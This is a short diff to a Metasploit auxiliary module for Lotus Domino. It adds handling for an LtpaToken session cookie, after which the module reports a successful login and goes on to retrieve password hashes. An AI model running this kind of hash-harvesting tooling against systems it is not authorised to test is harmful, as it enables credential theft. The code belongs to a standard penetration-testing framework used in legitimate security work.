@@ -93,16 +93,15 @@ class Metasploit3 < Msf::Auxiliary
 			if (res and res.code == 302 )
 				if res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/DomAuthSessId=(.*);(.*)/i)
 					cookie = "DomAuthSessId=#{$1}"
-
-					print_good("http://#{vhost}:#{rport} - Lotus Domino - SUCCESSFUL authentication for '#{user}'")
-					print_status("http://#{vhost}:#{rport} - Lotus Domino - Getting password hashs")
-					get_views(cookie,$uri)
-
+				elsif res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/LtpaToken=(.*);(.*)/i)
+					cookie = "LtpaToken=#{$1}"
 				else
 					print_error("http://#{vhost}:#{rport} - Lotus Domino - Unrecognized 302 response")
 					return :abort
-
 				end
+				print_good("http://#{vhost}:#{rport} - Lotus Domino - SUCCESSFUL authentication for '#{user}'")
+				print_status("http://#{vhost}:#{rport} - Lotus Domino - Getting password hashs")
+				get_views(cookie,$uri)
 
 			elsif (res and res.body.to_s =~ /names.nsf\?Login/)
 					print_error("http://#{vhost}:#{rport} - Lotus Domino - Authentication error: failed to login as '#{user}'")
